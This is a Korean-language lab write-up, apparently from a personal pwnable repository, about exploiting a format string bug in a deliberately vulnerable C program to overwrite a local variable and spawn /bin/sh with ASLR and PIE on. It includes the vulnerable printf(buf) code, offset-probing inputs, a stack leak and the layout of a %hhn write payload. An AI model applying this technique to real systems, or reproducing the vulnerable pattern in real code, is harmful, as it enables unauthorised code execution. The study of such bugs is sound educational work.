# FSB Local Overwrite (ASLR ON, PIE ON)

## 1. 목표

이 실습에서는 **Format String Vulnerability**를 이용해
`main`의 local 변수 `target`을 **`0xdeadbeef`로 overwrite**하고, 조건 분기를 통과해 **`/bin/sh`를 획득**한다.

### 환경

* ASLR: ON
* PIE: ON
* NX: ON
* Stack Canary: OFF

---

## 2. 취약 코드

```c
// filename: vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    int target = 0xcafebabe;
    char buf[100];

    puts("input1:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);             // format string vulnerability

    puts("input2:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);             // format string vulnerability (write here)

    if (target == 0xdeadbeef) {
        puts("good!");
        setregid(getegid(), getegid());
        system("/bin/sh");
    } else {
        printf("\ntarget = 0x%x\n", target);
    }
}
```

### 취약점 요약

* printf(buf)로 사용자의 입력값을 포맷스트링으로 사용하고 있다

  → **format string vulnerability(fsb)** 로 stack leak과 write가 가능하다.

---

## 3. 핵심 아이디어

### 3.1 왜 PIE/ASLR ON인데도 local overwrite가 되나?

ASLR/PIE는 주소를 랜덤화하지만, **한 번 실행된 프로세스 내부에서 `main` 스택 프레임 구조(EBP 기준 오프셋)는 고정**이다.

즉, 아래 오프셋은 실행마다 변하지 않는다.

* `&buf    = ebp - 0x80`
* `&target = ebp - 0x1c`

이 값은 디스어셈블리에서 확인 가능:

**buf 오프셋 근거**

```asm
lea eax, [ebp-0x80]
push eax
call fgets@plt
```

**target 오프셋 근거** (target 값을 printf 인자로 넘기는 지점)

```asm
push DWORD PTR [ebp-0x1c]
call printf@plt
```

---

## 4. input1: 기준(base) leak 잡기

### 4.1 Offset 찾기

```text
AAAA.%x.%x.%x.%x.%x.%x
```

출력에서 `41414141` 위치를 확인하면 offset을 구할 수 있다.

예시:

```text
AAAA.64.f28805c0.5e1cd1f5.ffc9b414.f28ad7de.41414141
```

→ `AAAA`가 6번째에 등장 → offset = 6

### 4.2 base leak 선택

이번 실습에서는 `input1`에서 안정적으로 잡히는 스택 값 하나를 base로 사용했다.

```text
AAAA.%4$x
```

예시 출력:

```text
AAAA.ff80c284
```

이 값은 gdb로 확인해보면 `$ebp`와 정확히 같진 않지만(차이 존재), **항상 고정 차이**를 가진다.

예시:

* leak(`%4$x`) = `0xff80c284`
* gdb `$ebp`   = `0xff80c298`

차이:

```
ebp - leak = 0x14
즉, leak = ebp - 0x14
```

> **노트**
>
> - PIE/ASLR이 켜져 있어도, **같은 스택 프레임 내부 local 변수**는 **기준값 leak + 고정 오프셋**으로 접근 가능하다.
> - leak된 값이 정확히 ebp 값일 필요는 없고, **target까지의 상대 오프셋이 고정**이면 충분하다.
> - 이때 leak되는 값은 printf가 자기 스택 프레임에서 사용 중인 것이 아니라, 스택에 연속으로 놓여 있던 **이전 함수(main)의 흔적**이다.

---

## 5. target 주소 계산

이미 알고 있는 오프셋:

* `&target = ebp - 0x1c`
* `leak = ebp - 0x14`

따라서:

```
&target
= (leak + 0x14) - 0x1c
= leak - 0x08
```

즉, 실행 중 leak만 얻으면 다음과 같이 계산 가능하다

```text
target_addr = leak - 0x08
```

---

## 6. input2: write용 ARG_BASE 구하기

`input2`에서는 payload 앞부분에 주소를 깔아야 하므로,
내가 깐 값이 printf에서 몇 번째 인자로 보이는지를 확인한다.

입력:

```text
BBBB.%p.%p.%p.%p.%p.%p.%p.%p
```

출력 예시:

```text
BBBB.0x64.0xe879a5c0.0x5c2391f5.0xff80c284.0xe87c77de.0x42424242...
```

`0x42424242`(BBBB)가 6번째에 등장 → **ARG_BASE(offset) = 6**

따라서 payload 선두에 4개 주소를 깔면:

* `%6$hhn` → `target`
* `%7$hhn` → `target+1`
* `%8$hhn` → `target+2`
* `%9$hhn` → `target+3`

페이로드 구성:
```
[target] [target+1] [target+2] [target+3]
[%{pad0}c%6$hhn]
[%{pad1}c%7$hhn]
[%{pad2}c%8$hhn]
[%{pad3}c%9$hhn]
```

gdb 실행 화면:
![gdb](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-local-overwrite/01.png)

> **노트**
> PIE가 켜져있을 경우 명령어 주소가 바뀌므로
> `b *main+N` 과 같이 심볼을 사용하여 상대적으로 브레이크 포인트를 건다. 

---

## 7. `%hhn`으로 0xdeadbeef 조립

목표 값:

```
0xdeadbeef
```

리틀엔디안 바이트 순서:

* `ef be ad de`

`%hhn`은 현재까지 출력된 바이트 수의 하위 1바이트를 기록하므로,
각 바이트에 맞게 `%<pad>c`로 출력량을 조절해 4번 기록한다.

스택 다이어그램:
```
높은 주소
+------------------+ 
|    saved EBP     | main의 saved ebp
+------------------+ ← ebp
|       ...        | 
+------------------+ 
|     target       | 덮어야할 로컬 변수
+------------------+ ← [ebp-0x1c]
|       ...        | 
+------------------+
|       buf        | 페이로드를 넣어 input2에서 인자로 사용
+------------------+ ← [ebp-0x80]
|       ...        | 여기 어딘가에서 leak 했었음
+------------------+
|    fmt(&buf)     | 
+------------------+
|    saved RET     | printf의 saved ret (input2)
+------------------+
|    saved EBP     | printf의 saved ebp (input2)
+------------------+
낮은 주소
```

---

## 9. 결과

![result](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-local-overwrite/02.png)

target 값이 0xdeadbeef로 바뀌어 "good!" 출력되고 쉘이 실행됐다.
